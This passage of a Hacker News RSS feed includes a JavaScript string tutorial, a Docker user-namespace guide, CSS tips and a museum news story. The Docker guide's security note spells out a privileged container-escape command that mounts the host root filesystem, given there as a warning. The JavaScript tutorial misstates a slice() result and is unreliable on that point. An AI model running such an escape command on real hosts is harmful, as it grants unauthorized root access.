</span><span></span><span>const</span> <span>chars</span> <span>=</span> <span>[</span><span>'h'</span><span>,</span> <span>'e'</span><span>,</span> <span>'l'</span><span>,</span> <span>'l'</span><span>,</span> <span>'o'</span><span>]</span>
<span>chars</span><span>[</span><span>0</span><span>]</span> <span>// 'h'
</span><span></span>
<span>// We get the first letter by using the `charAt()` method with index zero.
</span><span></span><span>const</span> <span>chars</span> <span>=</span> <span>'hello'</span>
<span>chars</span><span>[</span><span>0</span><span>]</span> <span>// 'h'
</span></code></pre></div><p>Now we have the first letter isolated from the rest of the string, we can utilize the <code>String.prototype.toUpperCase()</code> method to convert it to uppercase. This method does not convert the string itself, but returns a new string with all of its characters in uppercase. You can read more about the method at the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/toUpperCase">MDN docs</a>.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>'hello'</span>
<span>chars</span><span>[</span><span>0</span><span>].</span><span>toUpperCase</span><span>()</span> <span>// 'H'
</span></code></pre></div><h3 id="slice-the-rest-of-the-letters">Slice the rest of the letters</h3><p>Next we need to get the rest of string after the first character. As we gonna uppercase the first character and append the rest as is. To get a portion or a slice of an array, we can use the <code>Array.prototype.slice</code> method. This method gives us a slice between a start and end index. Read more about it at the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/slice">MDN docs</a>.</p><p>We already know that we do not want the first character (at index <code>0</code>), so our slice starts at <code>1</code>. Our word has <code>5</code> characters and as an array starts at <code>0</code>, our slice ends at <code>4</code>.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>[</span><span>'h'</span><span>,</span> <span>'e'</span><span>,</span> <span>'l'</span><span>,</span> <span>'l'</span><span>,</span> <span>'o'</span><span>]</span>
<span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>,</span> <span>4</span><span>)</span> <span>// ['e', 'l', 'l', 'o']
</span></code></pre></div><p>But this will not work if we do not know our string length upfront. So let’s use the <code>Array.prototype.length</code> property to pass the length of our string to the <code>slice</code> method.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>[</span><span>'h'</span><span>,</span> <span>'e'</span><span>,</span> <span>'l'</span><span>,</span> <span>'l'</span><span>,</span> <span>'o'</span><span>]</span>
<span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>,</span> <span>chars</span><span>.</span><span>length</span><span>)</span> <span>// ['e', 'l', 'l', 'o']
</span></code></pre></div><p>And as it is common to slice arrays till the end, we can even skip passing the length.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>[</span><span>'h'</span><span>,</span> <span>'e'</span><span>,</span> <span>'l'</span><span>,</span> <span>'l'</span><span>,</span> <span>'o'</span><span>]</span>
<span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span> <span>// ['e', 'l', 'l', 'o']
</span></code></pre></div><p>Now to slice a string, we can use <code>String.prototype.slice</code>. Which is identical to the array’s <code>slice</code> method. You can read more about it in the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/slice">MDN docs</a> as well.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>'hello'</span>
<span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span> <span>// 'ello'
</span></code></pre></div><p>So let’s now combine both the first uppercase character and the rest of the string.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>'hello'</span>
<span>chars</span><span>.</span><span>charAt</span><span>(</span><span>0</span><span>).</span><span>toUpperCase</span><span>()</span> <span>+</span> <span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span> <span>// 'Hello'
</span></code></pre></div><p>And that will gives us a capitalized string in JavaScript.</p><h2 id="just-use-css">Just use CSS</h2><p>Please remember though, that if its just for displaying a capitalized text on a web page, you can just use a CSS selector.</p><div><pre><code data-lang="html"><span>&lt;</span><span>style</span><span>&gt;</span>
    <span>.</span><span>capitalize</span> <span>{</span>
        <span>text-transform</span><span>:</span> <span>capitalize</span><span>;</span>
    <span>}</span>
<span>&lt;/</span><span>style</span><span>&gt;</span>

<span>&lt;</span><span>span</span> <span>class</span><span>=</span><span>"capitalize"</span><span>&gt;</span> hello <span>&lt;/</span><span>span</span><span>&gt;</span>
</code></pre></div></div></div>]]>
            </description>
            <link>https://robinvdvleuten.nl/blog/how-to-capitalize-strings-in-javascript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080514</guid>
            <pubDate>Fri, 13 Nov 2020 09:10:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Terraform Provider to manage Linux machine via SSH]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25080472">thread link</a>) | @rucciva
<br/>
November 13, 2020 | https://registry.terraform.io/providers/TelkomIndonesia/linux/latest/docs | <a href="https://web.archive.org/web/*/https://registry.terraform.io/providers/TelkomIndonesia/linux/latest/docs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://registry.terraform.io/providers/TelkomIndonesia/linux/latest/docs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080472</guid>
            <pubDate>Fri, 13 Nov 2020 09:00:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use Linux user namespaces to fix permissions in Docker volumes (2017)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080337">thread link</a>) | @joseluisq
<br/>
November 13, 2020 | https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/ | <a href="https://web.archive.org/web/*/https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      
<p>Not long ago, I publish <a href="https://www.jujens.eu/posts/en/2017/Feb/15/docker-unix-socket/">an article</a> about using Unix sockets with docker. These sockets where in docker volumes so they could be shared between various containers. The key idea was to change the UID and GID of the user that owns the socket in the container so they match those of the user that built the image. The main issue with this approach is that it requires you to build to container with the user that will run it. This makes the solution not portable.</p>
<p>Hopefully, the Linux kernel allows us to use an alternative to map user id inside the container to a predictable user id outside: user id namespaces. According to <a href="https://en.wikipedia.org/wiki/Linux_namespaces">wikipedia</a>: <cite>Namespaces are a feature of the Linux kernel that isolates and virtualizes system resources of a collection of processes. Examples of resources that can be virtualized include process IDs, hostnames, user IDs, network access, interprocess communication, and filesystems. Namespaces are a fundamental aspect of containers on Linux.</cite></p>
<p>For instance, thanks to the PID namespace, a process run inside a container can "think" it has the PID 1 inside a container while in fact it has another one. The same is true with user namespace: a user can "think" it has the 0 uid (root) while it fact it has the 1000 user id (some standard user). This will allow us to be sure for the files in a docker volumes that:</p>
<ul>
<li>All files belonging to the root user in the container will belong to a user of the system that is not root in the host.</li>
<li>All files belonging to other users in the container will be mapped to predictable uid (more on that latter).</li>
</ul>
<div id="configure-docker">
<h2><a href="#id1">Configure docker</a></h2>
<p>Lets configure docker to do all that.</p>
<p>First we either need to start the docker daemon with the <tt><span>--userns-remap</span> USER</tt> flag or make sure the configuration file of the docker daemon (<tt>/etc/docker/daemon.json</tt>) contains something like:</p>
<pre><span>{</span>
  <span>"userns-remap"</span><span>:</span> <span>"USER"</span>
<span>}</span>
</pre>
<p><strong>Notes:</strong></p>
<ol>
<li>In both cases, <tt>USER</tt> must be a valid user of the system (ie present in <tt>/etc/passwd</tt>).</li>
<li>Don't forget to restart the daemon if you have to edit the file.</li>
</ol>
</div>
<div id="configure-the-subordinate-uid-gid">
<h2><a href="#id2">Configure the subordinate uid/gid</a></h2>
<p><a href="http://man7.org/linux/man-pages/man5/subuid.5.html">subuid</a> and <a href="http://man7.org/linux/man-pages/man5/subgid.5.html">subgid</a> are used to specify the user/group ids an ordinary user can use to configure id mapping in a user namespace. They are written like: <tt>username:id:count</tt>. For instance, with <tt>jenselme:100000:65536</tt> it means that user <tt>jenselme</tt> can use 65536 user ids starting at 100000.</p>
<p>This will be used by docker to properly remap uid in the container to the host. For instance, with <tt>jenselme:100000:65536</tt>, a file with a uid of 33 in the container, will be a file with a uid of 100032 in the host. And you will have access to that file. Neat, isn't it?</p>
<p>Now that we've seen the theory, let's configure them properly. First, edit <tt>/etc/subuid</tt> and add (replace <tt>jenselme</tt> by your own user name):</p>
<pre>jenselme:1000:1
jenselme:100000:65536
</pre>
<p>You should be able to understand the second line. The first one is there for a slightly different purpose: make sure that all files created by root belong to the user with uid 1000. That's me on my machine, you should of course use your uid (you can get it with <tt>id <span>-u</span> USER</tt>). Otherwise, they will belong to uid 100000.</p>
<p>Now, edit <tt>/etc/subgid</tt> and add (replace <tt>jenselme</tt> by your own user name):</p>
<pre>jenselme:982:1
jenselme:100000:65536
</pre>
<p>The second line is the name in both cases. I didn't use <tt>jenselme:1000:1</tt> but <tt>jenselme:982:1</tt>. On my machine, 982 is the gui of the docker group (you can get it with <tt>getent group docker</tt>). This means that all files created by root, will belong to me and to the docker group. This "trick" can be handy if for some reason you need to share files with the docker daemon. For instance, software like <a href="https://traefik.io/">traefic</a> may need to read/write to the docker socket. By default, for this socket we have:</p>
<pre>[root@fastolfe ~]# ll /var/run/docker.sock
srw-rw----. 1 root docker 0 Jun 11 18:18 /var/run/docker.sock
</pre>
<p>This means that if in the outside the container the uid of root and its guid are mapped to those of jenselme, traefic won't be able to communicate with the socket because of the permissions of the file. Map the gid of root in the container to the gid of docker in the host allows us to prevent that issue.</p>
<p><strong>Note on security:</strong> Giving access to the docker socket is a problem from a security standpoint since it allows a container to create new containers thus giving it access to the whole host system <em>with root permissions</em>, eg by running <tt>docker run <span>-it</span> <span>-v</span> <span>--privileged</span> <span>-v</span> <span>/:/host</span> <span>--userns=host</span> fedora chroot /host</tt>. That is why SELinux will prevent the docker socket to be mounted in a volume by default. You should be aware of that when you do this. See <a href="http://danwalsh.livejournal.com/74095.html">this</a> for more on that topic.</p>
</div>
<div id="tests">
<h2><a href="#id3">Tests</a></h2>
<p>Now that we are all set, let's start the docker daemon (or restart it).</p>
<p><strong>Note to SELinux users:</strong> You need to append <tt>Z</tt> (capital z) when mounting the volumes, like this: <tt><span>-v</span> <span>$(pwd)/test:/test/:Z</span></tt>. Otherwise, the SELinux context will not be correct and you won't be able to access the volumes from the container. See <a href="https://www.jujens.eu/posts/2015/May/24/docker/#volumes">this docker tip</a>.</p>
<p>The first thing you should notice is that if you had downloaded images or created containers, you will not see them with <tt>docker images</tt> or <tt>docker ps <span>-a</span></tt>. That's because, when user re-mapping is enabled, all images and containers are located in a dedicated subfolder. On my machine, that is <tt>/var/lib/docker/1000.982</tt>.</p>
<p>Now that we know this is expected, let's try things. Run somewhere:</p>
<pre>docker run -it -v "$(pwd)/test:/test/" nginx /bin/bash
</pre>
<p>This will open a bash prompt as root in the container. Go to the volume with <tt>cd /test</tt> and create a file: <tt>touch rootfile</tt>. If you run a <tt>ls <span>-l</span></tt> inside the container, you should see something like:</p>
<pre>root@02a5bcc1757c:/test# ls -l
total 0
-rw-r--r--. 1 root   root 0 Jun 11 16:25 rootfile
</pre>
<p>Let's check the uid and gid to be sure:</p>
<pre>root@02a5bcc1757c:/test# ls -ln
total 0
-rw-r--r--. 1 0 0 0 Jun 11 16:25 rootfile
</pre>
<p>So the file belongs to root and its uid is 0 as well as its gid.</p>
<p>Now run <tt>ls <span>-l</span></tt> in the host:</p>
<pre>▶ ls -l
total 0
-rw-r--r--. 1 jenselme docker 0 Jun 11 18:25 rootfile
</pre>
<p>Let's check the uid and guid:</p>
<pre>▶ ls -ln
total 0
-rw-r--r--. 1   1000 982 0 Jun 11 18:25 rootfile
</pre>
<p>That's correct. Now let's do the same thing wit the <tt><span>www-data</span></tt> user. First, let's give some permissions on the <tt>/test</tt> folder to the <tt><span>www-data</span></tt> user. Since this is just a test, let's run <tt>chmod 777 /test</tt>. Now, switch to this user with <tt>su <span>-s</span> /bin/bash <span>www-data</span></tt>. You should now be in the <tt>/test</tt> directory connected as <tt><span>www-data</span></tt>. Create a file with <tt>touch <span>www-data-file</span></tt>. You should see something like:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -l
total 0
-rw-r--r--. 1 root     root     0 Jun 11 16:36 rootfile
-rw-r--r--. 1 www-data www-data 0 Jun 11 16:38 www-data-file
</pre>
<p>And:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -ln
total 0
-rw-r--r--. 1  0  0 0 Jun 11 16:36 rootfile
-rw-r--r--. 1 33 33 0 Jun 11 16:38 www-data-file
</pre>
<p>As far as the host is concerned, we have:</p>
<pre>▶ ls -l
total 0
-rw-r--r--. 1 jenselme docker 0 Jun 11 18:36 rootfile
-rw-r--r--. 1   100032 100032 0 Jun 11 18:38 www-data-file
</pre>
<p>And</p>
<pre>▶ ls -ln
total 0
-rw-r--r--. 1   1000    982 0 Jun 11 18:36 rootfile
-rw-r--r--. 1 100032 100032 0 Jun 11 18:38 www-data-file
</pre>
<p>Now let's create some files from the host. For instance, let's do <tt>touch <span>www-data-file-from-host</span></tt>. In the host it currently belongs to the current user. Let's see in the container:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -l
total 0
-rw-r--r--. 1 root     root     0 Jun 11 16:36 rootfile
-rw-r--r--. 1 www-data www-data 0 Jun 11 16:38 www-data-file
-rw-r--r--. 1 root     nogroup  0 Jun 11 16:41 www-data-file-from-host
</pre>
<p>It belongs to <tt>root</tt> and <tt>nogroup</tt> as expected (in the host, the file belongs to <tt>jenselme:jenselme</tt> not <tt>jenselme:docker</tt>, hence the <tt>nogroup</tt>, I could run <tt>chown jenselme:docker <span>www-data-file-from-host</span></tt> to fix the gid). If you check the uid and gid, you will see it is also as expected.</p>
<p>Now let's change the owner of <tt><span>www-data-file-from-host</span></tt> to <tt>100032:100032</tt> with <tt>chown 100032:100032 <span>www-data-file-from-host</span></tt> (this must be run as root to prevent an <em>Operation not permitted</em>). I let you check the owner, uid, gid in the container. You can also check that the <tt><span>www-data</span></tt> user can write in the file with <tt>echo 'test' &gt; <span>www-data-file-from-host</span></tt>.</p>
<p>This looks good isn't it? I found however one dark spot in this. If you try to edit <tt><span>www-data-file-from-host</span></tt> or <tt><span>www-data-file</span></tt> in the host, it will fail with <em>permission denied</em>. As far as I understand the subuid and subgid, this is not normal. If someone has an explanation for this, please leave a comment. I see two workarounds for that:</p>
<ol>
<li><p>The basic:</p>
<blockquote>
<ol>
<li>Create a group with id <tt>100032</tt> (as root): <tt>groupadd <span>-g</span> 100032 <span>docker-www-data</span></tt></li>
<li>Add yourself to this group (as root): <tt>usermod <span>-aG</span> <span>docker-www-data</span> jenselme</tt></li>
<li>Disconnect/reconnect or use the <tt>newgrp <span>docker-www-data</span></tt> command to take this change into account.</li>
<li>Give write permission to the group in the container: <tt>chmod g=rw <span>www-data-file</span></tt></li>
<li>Write in the file.</li>
</ol>
<p><strong>Note:</strong> You cannot do anything about the user since you can only have one user id.</p>
</blockquote>
</li>
<li><p>The elegant: use ACL (Access Control List). See the <a href="#external-links">external links</a> section to learn more about ACL. TL;DR, ACLs are a way to extend the standard permissions of the filesystem. With them, you can set permissions for a file or directory with very thin granularity for each users and groups of the system. To enable ACLs, run as root:</p>
<blockquote>
<ol>
<li><p><tt>setfacl <span>-Rdm</span> u:USER:rwX DIR</tt> (replace <tt>USER</tt> by a username and <tt>DIR</tt> by a path to a directory or file). This will:</p>
<blockquote>
<ul>
<li><tt><span>-R</span></tt> recurse on subfolders.</li>
<li><tt><span>-d</span></tt> default to this rule. This means that the ACL will apply to all files and directories created in <tt>DIR</tt> after the <tt>setfacl</tt> was run.</li>
<li><tt><span>-m</span></tt> modify the rule to <tt>u:USER:rwX</tt> that is give to the user (<tt>u:</tt>) <tt>USER</tt> the permissions <tt>rwX</tt>. The capital <tt>X</tt> means <em>give execution permission to all folders and to files that have the execute permissions</em>. This prevent us to make all files executable.</li>
<li>apply to <tt>DIR</tt></li>
</ul>
</blockquote>
</li>
<li><p><tt>setfacl <span>-Rm</span> u:USER:rwX DIR</tt> (replace <tt>USER</tt> by a username and <tt>DIR</tt> by a path to a directory or file). This will apply the ACL rule on the existing files in <tt>DIR</tt>.</p>
</li>
</ol>
</blockquote>
</li>
</ol>
</div>
<div id="bonus">
<h2><a href="#id4">Bonus</a></h2>
<div id="create-files">
<h3><a href="#id5">Create files</a></h3>
<p>If you can't or don't want to create the files (eg logs) when the images is created or when you start the container and be sure the container will be able to …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/">https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/</a></em></p>]]>
            </description>
            <link>https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080337</guid>
            <pubDate>Fri, 13 Nov 2020 08:38:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CSS Secrets to Improve Web Designs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080203">thread link</a>) | @xxlcloudinc
<br/>
November 13, 2020 | https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs | <a href="https://web.archive.org/web/*/https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="description">
<p>Have you long been using CSS to build some attractive web designs and layouts? Are you familiar with how CSS can help rejuvenate a bland webpage to create something enticing? CSS is much more than using those fancy fonts and creating backgrounds. No matter how long you have been using CSS to create powerful designs, there could still be some undiscovered features and CSS properties that you can leverage to take your designs to a whole new level. These lesser-known CSS secrets would allow you to influence content behavior on the websites and enjoy greater freedom when applying creative techniques to various elements like photography.</p>
<p>So, let’s discover some of these lesser-known CSS properties and find out how they could help with your futuristic web designs.</p>
<h2>Things You’ll Need:</h2>
<ul>
<li>A popular web browser and your favorite developer tools; it is recommended that you use Google Chrome or Firefox because they support most CSS features. </li>
<li>A reliable code editor </li>
<li>Some useful assets like fonts and images </li>
</ul>
<p>Once you have these, let’s start by exploring some lesser-known typographical CSS properties. </p>
<h2>Typographical Properties</h2>
<p>Many CSS properties enhance the way text is displayed on a web page. Some lesser-known options include the following: </p>
<h4>1. Text-Stroke</h4>
<p>If you already know about the text strokes used in Adobe Illustrator and some vector-drawing apps, you’d be happy to know that you can use them in CSS too. The text-stroke property can be used in CSS to achieve that same effect. <em>The text-stroke can also be animated using CSS</em> as you can apply the effect on stroke color. Unfortunately, stroke width can’t be animated.</p>
<pre><code>footer h3 {
/*more styles in style.css*/
/*...*/
  -webkit-text-fill-color: transparent;
  -webkit-text-stroke: 2px #000;
}</code></pre>
<h4>2. Gradient Text</h4>
<p>Applying gradient to text isn’t complicated anymore. Here’s a quick demonstration of how that attractive effect could be implemented on your website using WebKit while ensuring that the text still remains selectable and editable.</p>
<pre><code>h2.contact-heading { 
  -webkit-text-fill-color: transparent; 
  -webkit-background-clip: text; 
  background: radial-gradient(#ffbc00, #ff65aa);
}</code></pre>
<h4>3. ::first-letter</h4>
<p>It’s a pseudo-element which can be used for styling the first letter in a block-level element. With this, you can be able to introduce similar effects as in paper and print magazines.</p>
<pre><code>p.intro:first-letter { 
  font-size: 100px; 
  display: block; 
  float: left; 
  line-height: .5; 
  margin: 15px 15px 10px 0; 
}</code></pre>
<h2>Content Control</h2>
<p>Let’s now jump to the CSS properties that allow you to have greater control over your images and text’s behavior depending on their container size or proportion.</p>
<h4>4. Line-Clamp</h4>
<p>This property is useful for truncating text after a particular number of lines. This type of truncation usually requires three properties for it to work.<br>First, you must set the display property to <strong>-webkit-box</strong>. Next, you should set <strong>-webkit-box-orient</strong> or <strong>-webkit-inline-box</strong> to vertical. Lastly, keep the <strong>overflow</strong> value as hidden. If any of these are missing, you won’t be able to clip the content.</p>
<pre><code>p.shortened { 
  display: -webkit-box; 
  -webkit-line-clamp: 3; 
  -webkit-box-orient: vertical; 
  overflow: hidden; 
}</code></pre>
<h4>5. Character Unit</h4>
<p>The text height or width could be limited using CSS character unit property. The <em>ch</em> unit means the character width is the same as that of '0' (the zero character) when written in that same font, and has a specific use when combined with the monospace fonts. When a different font-family is used, it changes as well. You can treat it somewhat like <strong>x-height. </strong>However, the <strong>ch</strong> here is the width of the character '0' rather than that of x.</p>
<pre><code>h2.contact-heading {
  /*more properties in the CSS file*/
  max-width: 8ch;
}</code></pre>
<h4>6. Column-Count</h4>
<p>Using the column-count property in CSS, you direct the browser to distribute content evenly in the number of columns as specified.</p>
<pre><code>.outro {  
  column-count: 2;
}</code></pre>
<h4>7. Shape-Outside</h4>
<p>You can use the shape-outside CSS property to make a curved text effect around a floating image. Basically, the property allows for setting geometric shapes so that the text can flow around in a pre-defined area.</p>
<pre><code>.shape { 
  width: 300px; 
  float: left; 
  shape-outside: circle(50%); 
}</code></pre>
<h4>8. Word Break Tag &lt;wbr&gt;</h4>
<p>Though it’s a CSS tutorial, the &lt;wbr&gt; HTML tag is still worth mentioning here. The Word Break Tag is an HTML element that defines a word break opportunity. It refers to a position within a webpage text where the web browser may break the line. There are situations where it might be quite useful when a word is longer than usual, and you’re afraid that the web browser might break that word in a way, making it inappropriate to read and understand. For instance, a phone number could be too long, and the browser may break it in wrong areas. So, a &lt;wbr&gt; tag could be used to avoid that.</p>
<pre><code>&lt;wbr&gt;+0043&lt;wbr&gt;234-343&lt;wbr&gt;234-234&lt;wbr&gt; </code></pre>
<h4>9. Object Fit</h4>
<p>Frequently, it would be best if you control the image behavior on your web pages, depending on their container size. If you’re looking for a CSS property to achieve that effect, <strong>object-fit</strong> is undoubtedly recommended. The property defines how the content inside a <strong>&lt;video&gt;</strong> or <strong>&lt;img&gt;</strong> tag should be resized so that it fits inside the container perfectly.<br>There are four options available to fit the container’s content: <strong>fill</strong>, <strong>cover</strong>, <strong>contain</strong>, and <strong>scale-down</strong>. For instance, if you have used <strong>cover </strong>as the value of this property, you can size the container’s content so that its aspect ratio preserves while filling the element’s entire content box. </p>
<pre><code>.object-fit { 
  object-fit: cover; 
  height: 400px; 
  width: 100%; 
}</code></pre>
<h4>10. Display: Flex</h4>
<p>Vertically centering an element or text is always considered a problem, but there’s an easy way available to do that in CSS using Flexbox. The <strong>display: flex</strong> property was introduced in the CSS3, and it allows you to align just about any element vertically. Here’s how to do that.</p>
<pre><code>.align-vertically { 
  background: #13b5ea; 
  color: #fff; 
  display: flex; 
  align-items: center; 
  height: 200px; 
}</code></pre>
<p>A Flexbox layout is specified for an element using the <strong>display: flex</strong> property while vertical centering is taken care of using <strong>align-items: center</strong>.</p>
<h2>Decorative &amp; Creative Elements</h2>
<p>Even though there are comprehensive charting functions available through the data visualization libraries such as d3.js, why don’t you try CSS for simple pie charts? Besides, some often-ignored decorative elements could work for adding colors to your website. Let’s try and explore them.</p>
<h4>11. Conic-gradient</h4>
<p>If creating pie charts has always troubled you and you’ve been looking for a way to do that through CSS only, you’ve got your solution here. The conic-gradient function allows you to achieve the results you’re looking for. The function is great for creating an image using a gradient that has pre-set color transitions all rotated around the central point (instead of radiation from a central point, which is usually the case with the radial-gradient).</p>
<pre><code>.piechart { 
  background: conic-gradient(rgb(255, 132, 45) 0% 25%, rgb(166, 195, 209) 25% 56%, #ffb50d  56% 100%); 
  border-radius: 50%; 
  width: 300px; 
  height: 300px; 
}</code></pre>
<h4>12. Transition</h4>
<p>Transition is a very useful CSS property for smooth color change <em>on:hover</em><em>.</em> It helps create hover effects not only on links but other elements as well. These effects are visually appealing and allow for a smooth change of color. Here is one basic implementation of the CSS transition on links.</p>
<pre><code>a { 
 color: #1b80b7; 
 transition: all .2s linear; 
}
a:hover { color: #52bff2; }</code></pre>
<p>You can even use this technique for creating far more advanced and creative hover effects. The transition allows you to animate different properties of an element such as height, width, background, etc.</p>
<h4>13. Counters</h4>
<p>CSS counters allow you to style your numbered lists. With the help of counters, you could adjust your content’s appearance depending on the location it has on a web page. It could be quite a useful hack when it comes to styling your numbered lists.</p>
<p>For implementing CSS counters, you can:</p>
<ul>
<li>Increase/decrease counter value using <strong>counter-increment</strong></li>
<li>Use <strong>counter()</strong> or <strong>counters()</strong> function to display counter value from within the content property</li>
</ul>
<pre><code>ol.numbered-list &gt; li:before { 
  content: counter(li); 
  position: absolute; 
  box-sizing: border-box; 
  width: 45px; 
  height: 45px; 
  background: #f3b70f; 
  border-radius: 50%; 
} 

ol.numbered-list li { 
  position: relative; 
  left: 0px; 
  list-style: none; 
  counter-increment: li; 
}</code></pre>
<h4>14. ::selection</h4>
<p>With the "<strong>::selection</strong>" pseudo-element you can change the color of text selection by overriding at browser level to replace the color of text highlight with your defined color option. Your chosen color would appear when the content is selected using the cursor.</p>
<pre><code>:selection { 
  background-color: #f3b70f; 
}</code></pre>
<h4>15. Styling Broken Images</h4>
<p>Poor web designs don’t often have a way to manage broken images, and whenever an image is missing, the webpage doesn’t look good. Considering that the problem may arise now and then, advanced CSS could be used to styling broken images and make your custom error messages look presentable to the visitors. Here’s how you can do that:</p>
<pre><code>img { 
  font-family: 'Helvetica'; 
  font-weight: 300; 
  line-height: 2;   
  text-align: center; 
  width: 100%; 
  height: auto; 
  display: block; 
  position: relative; 
} 

img:before {  
  content: "We're sorry, the image below is broken :("; 
  display: block; 
  margin-bottom: 10px; 
} 

img:after {  
  content: "(url: " attr(src) ")"; 
  display: block; 
  font-size: 12px; 
}</code></pre>
<p>Here, we use <strong>:before</strong> and <strong>:after</strong> pseudo-classes to display error messages in case of a missing/broken image. The value of <strong>src</strong> property is returned using <strong>attr()</strong> function in CSS, displaying the faulty URLs.</p>
<h4>16. @support</h4>
<p>When using a CSS property that’s not supported by most web browsers, we advise using a feature query known as <strong>@support</strong> rule. It helps you to find out if the browser supports the CSS property: value pairs or not. Any code that you have put …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs">https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs</a></em></p>]]>
            </description>
            <link>https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080203</guid>
            <pubDate>Fri, 13 Nov 2020 08:16:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[French museum suspends Genghis exhibition in reaction to Chinese censorship bid]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25079764">thread link</a>) | @rbecker
<br/>
November 12, 2020 | https://www.rfi.fr/en/france/20201016-french-museum-suspends-genghis-exhibition-in-reaction-to-chinese-censorship-bid | <a href="https://web.archive.org/web/*/https://www.rfi.fr/en/france/20201016-french-museum-suspends-genghis-exhibition-in-reaction-to-chinese-censorship-bid">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                    A museum in France has decided to postpone an exhibition featuring Genghis Khan, legendary leader of the ancient Mongol empire, after Chinese authorities demanded a change in the title and complete access to exhibit descriptions.&nbsp;
                </p><div>
                    
                                        <p>The event was heralded as “one of the most comprehensive exhibitions on Genghis Khan and the Mongol empire ever presented internationally” by Edinburgh-based organisers&nbsp;<a href="http://www.nomadexhibitions.com/" target="_blank">Nomad Exhibitions</a> which initiated the cooperation with the <a href="http://www.nmgbwy.com/" target="_blank">Inner Mongolia Museum</a> in Hohhot, capital of China’s Inner Mongolia Autonomous Region, in 2007.</p><p>After ten years work to “establish a relationship” and win the trust of the Chinese partner – many objects have&nbsp;never before left China – &nbsp;Nomad found the Dutch <a href="http://www.nmm.nl/en/" target="_blank">National Military Museum</a> ready to host the exhibition for the first time, and it was launched in 2017 under the title “<a href="http://www.nomadexhibitions.com/genghis-rise-of-the-mongol-khans" target="_blank">Genghis, Rise of the Mongol Khans</a>.”</p>

    <div>
                    
<figure>
    <p><img src="https://s.rfi.fr/media/display/16305dfe-1228-11ea-ac0e-005056a99247/Genghis_Khan_empire-en.svg_.png" alt="The conquests of Genghis Khan's armies, 1207 - 1227" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-image-dataset="{&quot;url&quot;:&quot;https:\/\/s.rfi.fr\/media\/display\/16305dfe-1228-11ea-ac0e-005056a99247\/&quot;,&quot;filename&quot;:&quot;Genghis_Khan_empire-en.svg_.png&quot;,&quot;ratio&quot;:null,&quot;displayFormat&quot;:&quot;original&quot;}">
    </p>
                        <figcaption>
                <span>The conquests of Genghis Khan's armies, 1207 - 1227</span>                <span>© </span>            </figcaption>
            </figure>

